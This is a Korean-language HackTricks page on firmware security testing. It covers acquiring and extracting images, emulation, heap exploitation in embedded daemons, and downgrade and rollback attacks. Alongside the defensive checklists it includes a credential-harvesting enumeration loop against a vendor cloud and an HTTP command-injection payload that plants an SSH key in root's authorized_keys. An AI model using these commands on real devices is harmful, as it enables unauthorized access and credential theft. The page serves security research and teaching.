# 펌웨어 분석

{{#include ../../banners/hacktricks-training.md}}

{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/dds-rtps-security.md
{{#endref}}

## **소개**

### 관련 리소스

{{#ref}}
uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

{{#ref}}
synology-encrypted-archive-decryption.md
{{#endref}}

{{#ref}}
../../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md
{{#endref}}

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

{{#ref}}
mediatek-xflash-carbonara-da2-hash-bypass.md
{{#endref}}

펌웨어는 하드웨어 구성 요소와 사용자가 상호작용하는 소프트웨어 간의 통신을 관리하고 지원하여 기기가 올바르게 작동하도록 하는 필수 소프트웨어입니다. 펌웨어는 영구 메모리에 저장되므로 기기의 전원이 켜지는 순간부터 중요한 명령에 접근할 수 있으며, 이를 통해 운영 체제가 시작됩니다. 보안 취약점을 식별하기 위해서는 펌웨어를 검사하고 필요에 따라 수정하는 과정이 중요합니다.<sup>[[2]](#references)[[3]](#references)</sup>

## **정보 수집**

**정보 수집**은 기기의 구성과 사용 기술을 파악하는 데 중요한 초기 단계입니다. 이 과정에서는 다음과 같은 데이터를 수집합니다.

- CPU 아키텍처 및 기기에서 실행되는 운영 체제
- 부트로더 관련 세부 정보
- 하드웨어 구성 및 데이터시트
- 코드베이스 지표 및 소스 위치
- 외부 라이브러리 및 라이선스 유형
- 업데이트 기록 및 규제 인증
- 아키텍처 및 흐름도
- 보안 평가 및 확인된 취약점

이때 **오픈소스 인텔리전스(OSINT)** 도구는 매우 유용하며, 사용 가능한 오픈소스 소프트웨어 구성 요소를 수동 및 자동 검토 절차로 분석하는 것도 중요합니다. [Coverity Scan](https://scan.coverity.com) 및 [Semmle’s LGTM](https://lgtm.com/#explore)과 같은 도구는 잠재적인 문제를 찾는 데 활용할 수 있는 무료 정적 분석 기능을 제공합니다.

## **펌웨어 확보**

펌웨어는 여러 방법으로 확보할 수 있으며, 방법마다 복잡도가 다릅니다.

- 개발자나 제조업체 등 출처에서 **직접 확보**
- 제공된 지침에 따라 **빌드**
- 공식 지원 사이트에서 **다운로드**
- 호스팅된 펌웨어 파일을 찾기 위해 **Google dork** 쿼리 사용
- [S3Scanner](https://github.com/sa7mon/S3Scanner)와 같은 도구를 사용해 **클라우드 스토리지**에 직접 접근
- 중간자 기법으로 **업데이트** 가로채기
- **UART**, **JTAG** 또는 **PICit** 등의 연결을 통해 기기에서 **추출**
- 기기 통신 중 업데이트 요청 **스니핑**
- **하드코딩된 업데이트 엔드포인트** 식별 및 사용
- 부트로더나 네트워크에서 **덤프**
- 다른 방법이 모두 실패하면 적절한 하드웨어 도구를 사용해 저장 칩을 **분리하고 읽기**

### UART 로그만 있는 경우: 플래시의 U-Boot 환경 변수를 통해 root 셸 강제 실행

UART RX가 무시되더라도(로그만 출력되는 경우) 오프라인에서 **U-Boot 환경 변수 블롭을 편집**해 init 셸을 강제로 실행할 수 있습니다.<sup>[[6]](#references)</sup>

1. SOIC-8 클립과 프로그래머(3.3V)를 사용해 SPI 플래시를 덤프합니다:
   ```bash
   flashrom -p ch341a_spi -r flash.bin
   ```
2. U-Boot env 파티션을 찾고, `bootargs`를 편집해 `init=/bin/sh`를 포함한 다음, blob의 **U-Boot env CRC32를 다시 계산합니다**.
3. env 파티션만 다시 플래시하고 재부팅하면 UART에 shell이 나타납니다.

이는 bootloader shell은 비활성화되어 있지만 외부 flash 액세스로 env 파티션에 쓸 수 있는 임베디드 장치에서 유용합니다.

## 펌웨어 분석하기

이제 **펌웨어를 확보했으므로**, 펌웨어를 어떻게 다뤄야 할지 알 수 있도록 정보를 추출해야 합니다. 이를 위해 사용할 수 있는 도구는 다음과 같습니다.

```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #print offsets in hex
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```

해당 도구로 많은 것을 찾지 못했다면 `binwalk -E <bin>`으로 이미지의 **엔트로피**를 확인하세요. 엔트로피가 낮으면 암호화되었을 가능성이 낮습니다. 엔트로피가 높으면 암호화되었거나 어떤 방식으로든 압축되었을 가능성이 높습니다.

또한 다음 도구를 사용해 **펌웨어 내부에 포함된 파일**을 추출할 수 있습니다.


{{#ref}}
../../generic-methodologies-and-resources/basic-forensic-methodology/partitions-file-systems-carving/file-data-carving-recovery-tools.md
{{#endref}}

또는 파일을 검사하려면 [**binvis.io**](https://binvis.io/#/) ([code](https://code.google.com/archive/p/binvis/))를 사용할 수 있습니다.

### 파일 시스템 가져오기

앞서 언급한 `binwalk -ev <bin>` 같은 도구를 사용했다면 **파일 시스템을 추출**할 수 있었을 것입니다.\
Binwalk는 보통 파일 시스템을 **파일 시스템 유형과 같은 이름의 폴더** 안에 추출합니다. 일반적으로 유형은 다음 중 하나입니다: squashfs, ubifs, romfs, rootfs, jffs2, yaffs2, cramfs, initramfs.

#### 파일 시스템 수동 추출

때때로 binwalk의 signature에 파일 시스템의 **magic byte**가 포함되어 있지 않을 수 있습니다. 이런 경우 binwalk를 사용해 **파일 시스템의 오프셋을 찾고 바이너리에서 압축된 파일 시스템을 carve한 다음**, 아래 단계를 따라 유형에 맞게 파일 시스템을 **수동으로 추출**하세요.

```
$ binwalk DIR850L_REVB.bin

DECIMAL HEXADECIMAL DESCRIPTION
----------------------------------------------------------------------------- ---

0 0x0 DLOB firmware header, boot partition: """"dev=/dev/mtdblock/1""""
10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes
1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
```

Squashfs 파일 시스템을 carve하려면 다음 **dd command**를 실행합니다.

```
$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs

8257536+0 records in

8257536+0 records out

8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
```

또는 다음 명령을 실행할 수도 있습니다.

`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`

- squashfs의 경우(위 예시에서 사용)

`$ unsquashfs dir.squashfs`

이후 파일은 "`squashfs-root`" 디렉터리에 저장됩니다.

- CPIO 아카이브 파일

`$ cpio -ivd --no-absolute-filenames -F <bin>`

- jffs2 파일시스템의 경우

`$ jefferson rootfsfile.jffs2`

- NAND flash를 사용하는 ubifs 파일시스템의 경우

`$ ubireader_extract_images -u UBI -s <start_offset> <bin>`

`$ ubidump.py <bin>`

## Firmware 분석

Firmware를 확보한 후에는 구조와 잠재적 취약점을 파악하기 위해 이를 분석하는 것이 중요합니다. 이 과정에는 다양한 도구를 사용해 firmware 이미지를 분석하고 유용한 데이터를 추출하는 작업이 포함됩니다.

### 초기 분석 도구

바이너리 파일(`<bin>`으로 표시)을 초기 검사하기 위한 명령어 모음이 제공됩니다. 이 명령어를 사용하면 파일 형식을 식별하고, 문자열을 추출하고, 바이너리 데이터를 분석하며, 파티션과 파일시스템 세부 정보를 파악할 수 있습니다:

```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #prints offsets in hexadecimal
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head #useful for finding signatures in the header
fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
```

이미지의 암호화 상태를 평가하려면 `binwalk -E <bin>`로 **entropy**를 확인합니다. entropy가 낮으면 암호화되지 않았을 가능성이 높고, 높으면 암호화되었거나 압축되었을 가능성이 있습니다.

**내장 파일**을 추출하려면 **file-data-carving-recovery-tools** 문서와 파일 검사 도구인 **binvis.io** 같은 도구와 리소스를 사용하는 것이 좋습니다.

### 파일 시스템 추출하기

`binwalk -ev <bin>`을 사용하면 대개 파일 시스템을 추출할 수 있으며, 보통 파일 시스템 유형(squashfs, ubifs 등)을 이름으로 하는 디렉터리에 저장됩니다. 하지만 magic bytes가 없어 **binwalk**가 파일 시스템 유형을 인식하지 못하면 수동으로 추출해야 합니다. 이때 `binwalk`로 파일 시스템의 오프셋을 찾은 다음 `dd` 명령으로 파일 시스템을 추출합니다:

```bash
$ binwalk DIR850L_REVB.bin

$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
```

이후 파일 시스템 유형(예: squashfs, cpio, jffs2, ubifs)에 따라 콘텐츠를 수동으로 추출하는 데 서로 다른 명령을 사용합니다.

### 파일 시스템 분석

파일 시스템을 추출한 뒤에는 보안 결함을 찾기 시작합니다. 보안이 취약한 네트워크 데몬, 하드코딩된 자격 증명, API 엔드포인트, 업데이트 서버 기능, 컴파일되지 않은 코드, 시작 스크립트, 오프라인 분석을 위한 컴파일된 바이너리에 주의를 기울입니다.

**주요 위치** 및 검사할 **항목**은 다음과 같습니다.

- 사용자 자격 증명을 확인할 **etc/shadow** 및 **etc/passwd**
- **etc/ssl**의 SSL 인증서 및 키
- 잠재적 취약점이 있는지 확인할 구성 및 스크립트 파일
- 추가 분석을 위한 임베디드 바이너리
- 일반적인 IoT 장치 웹 서버 및 바이너리

파일 시스템에서 민감한 정보와 취약점을 찾는 데 여러 도구를 사용할 수 있습니다.

- 민감한 정보 검색을 위한 [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) 및 [**Firmwalker**](https://github.com/craigz28/firmwalker)
- 포괄적인 펌웨어 분석을 위한 [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core)
- 정적 및 동적 분석을 위한 [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer), [**ByteSweep**](https://gitlab.com/bytesweep/bytesweep), [**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go) 및 [**EMBA**](https://github.com/e-m-b-a/emba)

### 컴파일된 바이너리의 보안 검사

파일 시스템에서 발견된 소스 코드와 컴파일된 바이너리 모두 취약점이 있는지 면밀히 살펴봐야 합니다. Unix 바이너리용 **checksec.sh**와 Windows 바이너리용 **PESecurity** 같은 도구를 사용하면 악용될 수 있는 보호되지 않은 바이너리를 식별할 수 있습니다.

## 파생 URL 토큰을 통한 클라우드 구성 및 MQTT 자격 증명 수집

많은 IoT 허브는 다음과 같은 클라우드 엔드포인트에서 장치별 구성을 가져옵니다.<sup>[[5]](#references)</sup>

- `https://<api-host>/pf/<deviceId>/<token>`

펌웨어 분석 중에 `<token>`이 하드코딩된 비밀값을 사용해 장치 ID에서 로컬로 파생되는 것을 발견할 수 있습니다. 예를 들면 다음과 같습니다.

- token = MD5( deviceId || STATIC_KEY )이며 대문자 16진수로 표현됨

이 설계에서는 장치 ID와 STATIC_KEY를 알아낸 누구나 URL을 재구성해 클라우드 구성을 가져올 수 있습니다. 이 구성에는 평문 MQTT 자격 증명과 토픽 접두사가 포함되는 경우가 많습니다.

실제 작업 흐름:

1) UART 부팅 로그에서 deviceId 추출

- 3.3V UART 어댑터(TX/RX/GND)를 연결하고 로그를 캡처합니다:

```bash
picocom -b 115200 /dev/ttyUSB0
```

- 클라우드 구성 URL 패턴과 브로커 주소를 출력하는 줄을 찾아보세요. 예를 들면:

```
Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
MQTT: mqtt://mq-gw.vendor.tld:8001
```

2) 펌웨어에서 STATIC_KEY와 토큰 알고리즘 복구

- 바이너리를 Ghidra/radare2에 로드하고 config 경로("/pf/") 또는 MD5 사용 여부를 검색합니다.
- 알고리즘을 확인합니다(예: MD5(deviceId||STATIC_KEY)).
- Bash에서 토큰을 도출하고 digest를 대문자로 변환합니다:

```bash
DEVICE_ID="d88b00112233"
STATIC_KEY="cf50deadbeefcafebabe"
printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
```

3) 클라우드 구성 및 MQTT 자격 증명 수집

- URL을 구성하고 curl로 JSON을 가져온 다음, jq로 파싱해 비밀 정보를 추출합니다:

```bash
API_HOST="https://api.vendor.tld"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
```

4) 평문 MQTT 및 취약한 topic ACL 악용 (있는 경우)

- 복구한 자격 증명을 사용해 maintenance topic을 구독하고 민감한 이벤트를 찾아봅니다.

```bash
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
  -i <client_id> -u <username> -P <password> \
  -t "<topic_prefix>/<deviceId>/admin" -v
```

5) 예측 가능한 기기 ID 열거(대규모로, 승인받은 상태에서)

- 많은 생태계에서 공급업체 OUI/제품/유형 바이트 뒤에 순차 접미사를 붙입니다.
- 후보 ID를 순회하고, token을 도출한 다음, 프로그래밍 방식으로 config를 가져올 수 있습니다:

```bash
API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
for SUF in $(seq -w 000000 0000FF); do
  DEVICE_ID="${PREFIX}${SUF}"
  TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
  curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
done
```

참고 사항
- 대량 열거를 시도하기 전에 항상 명시적인 승인을 받으세요.
- 가능하면 대상 하드웨어를 수정하지 않고 비밀을 복구할 수 있도록 에뮬레이션이나 정적 분석을 우선하세요.


펌웨어를 에뮬레이션하면 기기의 동작이나 개별 프로그램에 대한 **동적 분석**을 수행할 수 있습니다. 이 접근 방식은 하드웨어 또는 아키텍처 종속성으로 인해 어려움이 발생할 수 있지만, Raspberry Pi와 같이 아키텍처와 엔디언이 일치하는 기기나 사전 구축된 가상 머신으로 루트 파일 시스템 또는 특정 바이너리를 옮기면 추가 테스트를 진행할 수 있습니다.

### 개별 바이너리 에뮬레이션

단일 프로그램을 조사할 때는 프로그램의 엔디언과 CPU 아키텍처를 파악하는 것이 중요합니다.

#### MIPS 아키텍처 예제

MIPS 아키텍처 바이너리를 에뮬레이션하려면 다음 명령을 사용할 수 있습니다:

```bash
file ./squashfs-root/bin/busybox
```

그리고 필요한 에뮬레이션 도구를 설치하려면:

```bash
sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
```

MIPS(big-endian)의 경우 `qemu-mips`를 사용하며, little-endian 바이너리에는 `qemu-mipsel`을 사용합니다.

#### ARM Architecture 에뮬레이션

ARM 바이너리의 경우에도 과정은 비슷하며, `qemu-arm` 에뮬레이터를 사용해 에뮬레이션합니다.

### Full System 에뮬레이션

[Firmadyne](https://github.com/firmadyne/firmadyne), [Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit) 등의 도구는 전체 펌웨어 에뮬레이션을 지원하며, 프로세스를 자동화하고 동적 분석을 돕습니다.

## 실제 환경에서의 동적 분석

이 단계에서는 실제 또는 에뮬레이션된 장치 환경을 사용해 분석합니다. OS와 파일시스템에 대한 shell access를 유지하는 것이 중요합니다. 에뮬레이션이 하드웨어 상호작용을 완벽하게 모방하지 못할 수 있으므로 에뮬레이션을 가끔 재시작해야 할 수 있습니다. 분석 시 파일시스템을 다시 살펴보고, 노출된 웹페이지와 네트워크 서비스를 악용하며, 부트로더 취약점을 조사해야 합니다. 잠재적인 backdoor 취약점을 식별하려면 펌웨어 무결성 테스트가 중요합니다.

## 런타임 분석 기법

런타임 분석은 gdb-multiarch, Frida, Ghidra 같은 도구를 사용해 프로세스 또는 바이너리가 실행되는 환경에서 상호작용하고, breakpoint를 설정하며, fuzzing 및 기타 기법을 통해 취약점을 식별하는 작업입니다.

전체 debugger가 없는 임베디드 대상에서는 **정적으로 링크된 `gdbserver`를 장치에 복사한 다음 원격으로 연결하세요**:<sup>[[6]](#references)</sup>

```bash
# On device
gdbserver :1234 /usr/bin/targetd
```

```bash
# On host
gdb-multiarch /path/to/targetd
target remote <device-ip>:1234
```

### Zigbee / radio-co-processor 메시지 매핑

IoT 허브에서는 RF 스택이 **radio MCU**와 Linux userland 프로세스 사이에 분리되어 있는 경우가 많습니다. 유용한 작업 흐름은 다음 경로를 매핑하는 것입니다:<sup>[[8]](#references)</sup>

1. 무선상의 **RF frame**
2. radio MCU의 **controller-side parser**
3. Linux로 전달되는 **serial/UART 텍스트 또는 TLV 프로토콜**(예: `/dev/tty*`)
4. 메인 daemon의 **application dispatcher**
5. **프로토콜별 handler / state machine**

이 아키텍처에서는 리버싱 대상이 하나가 아니라 둘이 됩니다. 컨트롤러가 바이너리 무선 프레임을 `Group,Command,arg1,arg2,...`와 같은 텍스트 프로토콜로 변환한다면, 다음을 파악하세요.

- **메시지 그룹** 및 dispatch 테이블
- 어떤 메시지를 **네트워크**에서 받을 수 있고 어떤 메시지가 컨트롤러 자체에서 오는지
- 정확한 **제조업체별 판별 필드**(예: Zigbee `manufacturer_code` 및 사용자 지정 `cluster_command`)
- 어떤 handler가 **commissioning**, discovery 또는 펌웨어/모델 다운로드 단계에서만 도달 가능한지

특히 Zigbee에서는 pairing 트래픽을 캡처하고 대상이 여전히 기본 **Link Key**인 `ZigBeeAlliance09`에 의존하는지 확인하세요. 그렇다면 commissioning 트래픽을 sniffing하여 **Network Key**를 노출할 수 있습니다. Zigbee 3.0 install code는 이 노출 위험을 줄이므로, 테스트 대상 장치에서 실제로 이를 강제하는지 기록하세요.

### 제조업체별 프로토콜 handler 및 FSM으로 제어되는 도달 가능성

벤더별 Zigbee/ZCL 명령은 표준화된 cluster보다 나은 대상인 경우가 많습니다. **사용자 지정 parsing 코드**와 내부 **FSM**으로 전달되어, 검증이 충분히 검증되지 않았을 가능성이 크기 때문입니다.<sup>[[8]](#references)</sup>

실용적인 작업 흐름:

- **벤더 전용 handler**를 찾을 때까지 command dispatcher를 리버스 엔지니어링합니다.
- **FSM state**, **event**, **check**, **action**, **next-state** 테이블을 복원합니다.
- 자동으로 다음 상태로 진행되는 **transitional state**와, 결국 공격자가 제어하는 상태를 초기화하거나 해제하는 retry/error 분기를 식별합니다.
- 버그가 있는 handler에 항상 도달할 수 있다고 가정하지 말고, daemon을 취약한 상태로 만들기 위해 필요한 정상적인 프로토콜 교환을 확인합니다.

타이밍에 민감한 프로토콜에서는 Python framework의 packet replay가 너무 느릴 수 있습니다. 더 신뢰할 수 있는 방법은 벤더급 스택을 사용해 실제 하드웨어(예: **nRF52840**)에서 정상 장치를 에뮬레이션하여 올바른 **endpoints**, **attributes**, commissioning 타이밍을 구현하는 것입니다.

### 임베디드 daemon의 분할 다운로드 버그 유형

임베디드 펌웨어에서는 **분할된 blob/model/configuration 다운로드**에서 반복적으로 나타나는 버그 유형이 있습니다.<sup>[[8]](#references)</sup>

1. **첫 번째 fragment**(`offset == 0`)가 `ctx->total_size`를 저장하고 `malloc(total_size)`을 할당합니다.
2. 이후 fragment는 `packet_total_size >= offset + chunk_len` 같은 공격자가 제어하는 **패킷 단위** 필드만 검증합니다.
3. 복사 작업은 **최초 할당 크기**를 확인하지 않고 `memcpy(&ctx->buffer[offset], chunk, chunk_len)`을 호출합니다.

이를 통해 공격자는 다음을 전송할 수 있습니다.

- 작은 heap 할당을 유도하도록 선언된 전체 크기가 **작은** 유효한 첫 fragment
- **예상 offset**은 유지하면서 더 큰 `chunk_len`을 지정한 후속 fragment
- 새 검증은 통과하면서 최초 할당된 buffer는 여전히 overflow시키는 위조된 패킷 단위 크기

취약한 경로가 commissioning 로직 뒤에 있다면, 잘못된 fragment를 보내기 전에 대상이 예상된 model-download 또는 blob-download 상태에 진입하도록 충분한 **장치 에뮬레이션**을 수행해야 합니다.

### 프로토콜로 유도하는 `free()` 트리거

임베디드 daemon에서 heap metadata exploitation을 유도하는 가장 쉬운 방법은 흔히 "정리될 때까지 기다리는 것"이 아니라 **프로토콜 자체의 오류 처리를 강제로 실행하는 것**입니다.<sup>[[8]](#references)</sup>

- 잘못된 후속 fragment를 보내 FSM을 **retry** 또는 **error** 상태로 전이시킵니다.
- retry 임계값을 초과시켜 daemon이 **context를 초기화**하고 손상된 buffer를 해제하도록 합니다.
- 프로세스가 다른 이유로 충돌하기 전에 이 예측 가능한 `free()`를 이용해 allocator 측 primitive를 트리거합니다.

이는 특히 임베디드 Linux의 **musl/uClibc/dlmalloc 계열** allocator를 대상으로 할 때 유용합니다. chunk metadata를 손상시키면 unlink/unbin 로직을 write primitive로 바꿀 수 있습니다. 안정적인 패턴은 실제 bin pointer를 즉시 덮어써 프로세스를 충돌시키는 대신, **size field**를 손상시켜 allocator의 traversal이 overflow된 buffer 안에 배치된 **fake chunk**로 향하게 하는 것입니다.

## Binary Exploitation 및 Proof-of-Concept

식별된 취약점에 대한 PoC를 개발하려면 대상 아키텍처를 깊이 이해하고 저수준 언어로 프로그래밍해야 합니다. 임베디드 시스템에서는 binary runtime protection이 드물지만, 존재할 경우 Return Oriented Programming (ROP) 같은 기법이 필요할 수 있습니다.

### uClibc fastbin exploitation 참고 사항 (임베디드 Linux)

- **Fastbin 및 consolidation:** uClibc는 glibc와 유사한 fastbin을 사용합니다. 이후 큰 할당이 `__malloc_consolidate()`를 트리거할 수 있으므로 fake chunk는 검사를 통과해야 합니다(올바른 크기, `fd = 0`, 주변 chunk가 "사용 중"으로 인식될 것).<sup>[[6]](#references)</sup>
- **ASLR이 적용된 non-PIE 바이너리:** ASLR이 활성화되어 있어도 메인 바이너리가 **non-PIE**라면 바이너리 내부의 `.data/.bss` 주소는 고정됩니다. 이미 유효한 heap chunk header처럼 보이는 영역을 대상으로 하여 fastbin 할당이 **function pointer table**에 도달하게 할 수 있습니다.
- **파서를 멈추는 NUL:** JSON을 파싱할 때 payload의 `\x00`은 파싱을 멈추면서도 뒤에 오는 공격자 제어 바이트를 stack pivot/ROP chain에 사용할 수 있게 합니다.
- **`/proc/self/mem`을 통한 shellcode:** `open("/proc/self/mem")`, `lseek()`, `write()`를 호출하는 ROP chain으로 알려진 mapping에 실행 가능한 shellcode를 기록한 다음 그 위치로 jump할 수 있습니다.

## 펌웨어 분석용 사전 구성 운영 체제

[AttifyOS](https://github.com/adi0x90/attifyos) 및 [EmbedOS](https://github.com/scriptingxss/EmbedOS) 같은 운영 체제는 펌웨어 보안 테스트에 필요한 도구를 갖춘 사전 구성 환경을 제공합니다.

## 펌웨어 분석용 사전 구성 OS

- [**AttifyOS**](https://github.com/adi0x90/attifyos): AttifyOS는 사물 인터넷(IoT) 장치의 보안 평가와 penetration testing을 지원하기 위한 배포판입니다. 필요한 모든 도구가 설치된 사전 구성 환경을 제공하여 시간을 크게 절약할 수 있습니다.
- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS): 펌웨어 보안 테스트 도구가 미리 설치된 Ubuntu 18.04 기반 임베디드 보안 테스트 운영 체제입니다.

## 펌웨어 다운그레이드 공격 및 안전하지 않은 업데이트 메커니즘

벤더가 펌웨어 이미지의 암호화 서명 검사를 구현하더라도 **버전 롤백(다운그레이드) 보호**는 자주 누락됩니다. boot 또는 recovery loader가 내장된 공개 키로 서명만 검증하고 플래시할 이미지의 *버전*(또는 단조 증가 카운터)을 비교하지 않는다면, 공격자는 **유효한 서명이 남아 있는 오래된 취약 펌웨어**를 정상적으로 설치하여 패치된 취약점을 다시 악용할 수 있습니다.<sup>[[4]](#references)</sup>

일반적인 공격 흐름:

1. **서명된 이전 이미지 확보**
   * 벤더의 공개 다운로드 포털, CDN 또는 지원 사이트에서 가져옵니다.
   * 함께 제공되는 모바일/데스크톱 애플리케이션에서 추출합니다(예: Android APK의 `assets/firmware/`).
   * VirusTotal, Internet archives, 포럼 등의 서드파티 저장소에서 가져옵니다.
2. 노출된 업데이트 채널을 통해 장치에 이미지를 **업로드하거나 제공**합니다.
   * Web UI, mobile-app API, USB, TFTP, MQTT 등
   * 많은 소비자용 IoT 장치는 인증되지 않은 HTTP(S) endpoint를 노출하며, 이 endpoint는 Base64로 인코딩된 펌웨어 blob을 받아 서버 측에서 디코딩하고 recovery/upgrade를 실행합니다.
3. 다운그레이드 후, 최신 릴리스에서 패치된 취약점을 악용합니다(예: 이후에 추가된 command-injection 필터).
4. 선택적으로 최신 이미지를 다시 플래시하거나 persistence를 확보한 뒤 탐지를 피하기 위해 업데이트를 비활성화합니다.

### 예시: 다운그레이드 후 Command Injection

```http
POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
Content-Type: application/octet-stream
Content-Length: 0
```

취약한(다운그레이드된) 펌웨어에서는 `md5` 매개변수가 정화 과정 없이 셸 명령에 직접 연결되어 임의의 명령을 삽입할 수 있습니다(여기서는 SSH 키 기반 root 접근을 활성화). 이후 펌웨어 버전에서는 기본적인 문자 필터가 도입되었지만, 다운그레이드 보호가 없어 이 수정은 무용지물입니다.<sup>[[4]](#references)</sup>

### 모바일 앱에서 펌웨어 추출하기

많은 벤더는 앱이 Bluetooth/Wi-Fi를 통해 기기를 업데이트할 수 있도록 전체 펌웨어 이미지를 함께 제공하는 모바일 앱에 포함합니다. 이러한 패키지는 흔히 `assets/fw/` 또는 `res/raw/` 같은 경로의 APK/APEX에 암호화되지 않은 상태로 저장됩니다. `apktool`, `ghidra` 같은 도구나 일반 `unzip`만으로도 실제 하드웨어에 접근하지 않고 서명된 이미지를 추출할 수 있습니다.<sup>[[4]](#references)</sup>

```
$ apktool d vendor-app.apk -o vendor-app
$ ls vendor-app/assets/firmware
firmware_v1.3.11.490_signed.bin
```

### A/B slot 설계에서 updater만 대상으로 하는 anti-rollback 우회

일부 vendor는 anti-downgrade **ratchet**을 구현하지만, *updater* 로직 내부에만 적용합니다(예: CAN을 통한 UDS routine, recovery command 또는 userspace OTA agent). 이후 **bootloader**가 이미지 signature/CRC만 확인하고 partition table 또는 slot metadata를 신뢰한다면, rollback protection을 여전히 우회할 수 있습니다.<sup>[[7]](#references)</sup>

일반적인 취약 설계:

- Firmware metadata에 version descriptor와 **security ratchet** / monotonic counter가 모두 포함되어 있습니다.
- Updater는 이미지의 ratchet을 persistent storage에 저장된 값과 비교하고, 더 오래된 signed image를 거부합니다.
- **Bootloader**는 해당 ratchet을 파싱하지 않고, 선택한 slot을 부팅하기 전에 header, CRC, signature만 검증합니다.
- Slot 활성화 정보는 partition table이나 slot별 generation counter에 별도로 저장되며, 검증된 정확한 firmware digest에 **암호학적으로 바인딩되지 않습니다**.

이로 인해 dual-slot 시스템에서 **한 이미지를 검증하고 다른 이미지를 부팅하는** primitive가 생깁니다. 공격자가 updater로 하여금 현재 signed image를 사용해 slot B를 다음 부팅 대상으로 지정하게 한 뒤, 재부팅 전에 slot B를 덮어쓸 수 있다면, bootloader는 이미 커밋된 slot metadata만 신뢰하므로 다운그레이드된 이미지를 부팅할 수 있습니다.

일반적인 악용 패턴:

1. **현재 signed** firmware를 passive slot에 업로드하고 일반적인 검증/전환 routine을 실행해 해당 slot이 다음 active slot이 되도록 layout을 설정합니다.
2. **아직 재부팅하지 않습니다**. 같은 session에서 slot-preparation/erase routine을 다시 실행합니다.
3. 오래된 boot-state 또는 slot-selection 로직을 악용해 updater가 방금 승격한 **동일한 물리 slot**을 지우도록 합니다.
4. 더 오래되었지만 여전히 signed된 firmware를 해당 slot에 씁니다.
5. ratchet을 적용하는 검증 routine을 건너뛰고 바로 재부팅합니다.
6. Bootloader는 승격된 slot을 선택하고 signature/integrity만 확인한 뒤 이전 이미지를 부팅합니다.

A/B update 구현을 reverse engineering할 때 확인할 사항:

- Slot 선택이 성공적인 전환 후에도 갱신되지 않는 **부팅 시점 플래그**를 기반으로 하는지 여부.
- `prepare_passive_slot()` 형태의 routine이 **현재 커밋된 layout**이 아니라 오래된 상태를 바탕으로 slot을 지우는지 여부.
- `part_write_layout()` 형태의 함수가 검증된 image hash를 저장하지 않고 **generation counter** / active flag만 갱신하는지 여부.
- Ratchet 검사가 userspace 또는 updater 코드에만 구현되고 ROM / bootloader / secure boot 단계에는 없는지 여부.
- Erase 또는 recovery routine 실행 후 콘텐츠가 삭제되고 다시 써졌는데도 slot이 bootable 상태로 남는지 여부.

### Update Logic 평가 체크리스트

* *Update endpoint*의 전송/인증이 적절히 보호되는가(TLS + 인증)?
* Flashing 전에 기기가 **version number** 또는 **monotonic anti-rollback counter**를 비교하는가?
* 이미지가 secure boot chain 내부에서 검증되는가(예: ROM code가 signature를 확인)?
* **Bootloader가 signature/CRC만 확인하는 대신 updater와 동일한 ratchet을 적용하는가?**
* Slot 활성화 metadata가 **검증된 firmware digest/version에 바인딩**되어 있는가, 아니면 승격 후 slot을 수정할 수 있는가?
* Slot 전환에 성공한 뒤 기기가 강제로 재부팅되는가, 아니면 같은 session에서 후속 update/erase routine을 계속 실행할 수 있는가?
* Userland code가 추가 sanity check를 수행하는가(예: 허용된 partition map, model number)?
* *Partial* 또는 *backup* update flow도 동일한 검증 로직을 재사용하는가?

> 💡  위 항목 중 하나라도 빠져 있다면 해당 platform은 rollback attack에 취약할 가능성이 높습니다.

## 취약한 firmware로 연습하기

Firmware 취약점 발견을 연습하려면 다음 취약 firmware project를 시작점으로 사용하세요.

- OWASP IoTGoat
  - [https://github.com/OWASP/IoTGoat](https://github.com/OWASP/IoTGoat)
- The Damn Vulnerable Router Firmware Project
  - [https://github.com/praetorian-code/DVRF](https://github.com/praetorian-code/DVRF)
- Damn Vulnerable ARM Router (DVAR)
